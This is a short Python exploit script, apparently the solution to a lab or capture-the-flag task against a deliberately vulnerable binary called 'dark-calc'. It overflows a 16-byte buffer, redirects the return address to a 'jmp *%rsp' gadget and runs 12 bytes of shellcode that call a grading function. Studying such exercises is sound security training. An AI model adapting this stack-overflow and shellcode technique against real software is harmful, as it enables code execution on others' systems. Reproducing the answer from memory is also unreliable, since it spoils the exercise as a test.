#!/usr/bin/env python3
"""Task 2: stack execution on dark-calc.

dark-calc installs an executable stack: its constructor init_fixed_stack()
mmaps an 8 MiB RWX region and __wrap_main() switches rsp to its top.  The
top is page-aligned and main/input only use the last 0x30 bytes, so a
payload longer than 47 bytes would be cut off by the following unmapped
page.  The return address is therefore redirected to `jmp *%rsp`
(0x401e0b, an `ff e4` pair inside the executable LOAD segment), and the
12-byte shellcode immediately after it calls grade_eval(4).

At the shellcode entry rsp is 16-byte aligned, so `call rax` enters
grade_eval with the ABI-required rsp % 16 == 8.
"""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

shellcode = bytes.fromhex(
    "bf04000000"   # mov edi, 4        ; grade_eval argument
    "b8871a4000"   # mov eax, 0x401a87 ; grade_eval
    "ffd0"         # call rax
)

payload  = b"A" * 16                  # expression[16]
payload += p64(0x4141414141414141)    # saved rbp (unused)
payload += p64(0x401E0B)              # jmp *%rsp
payload += shellcode                  # 12 bytes; total 44 (+NUL) < 48

sys.stdout.buffer.write(payload)
